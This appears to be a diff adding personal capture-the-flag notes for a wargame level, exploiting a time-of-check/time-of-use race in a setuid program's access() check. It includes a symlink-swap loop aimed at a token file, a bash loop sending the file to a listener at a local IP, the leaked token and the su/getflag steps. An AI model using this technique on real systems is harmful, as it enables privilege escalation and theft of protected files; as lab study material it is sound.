@@ -1,0 +1,57 @@
+from strings cmd  --> access to check the file permissions
+
+can't symlink exploit because " If pathname is a symbolic link, it is dereferenced." *man*
+
+BUT : (from man as well)
+NOTES
+       Warning:  Using  access()  to  check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the
+       short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.
+
+race condition ?
+
+spam ln -sf ~/token /tmp/x ?
+nop but
+touch /tmp/x ; rm /tmp/x ; ln -s ~/token /tmp/x ; rm -f /tmp/x
+
+run my ft_p 6969 on the network
+
+then spam connection
+#!/bin/bash
+while true;do
+./level10 /tmp/x 192.168.1.42
+done
+
+on my ftp :
+
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+woupa2yuojeeaa[...]       <=== :o
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+cmd not found
+Reading the cmd from socket...
+.*( )*.
+
+$ su flag10
+passwd: youpa[...]
+$getflag
+feulo[...]
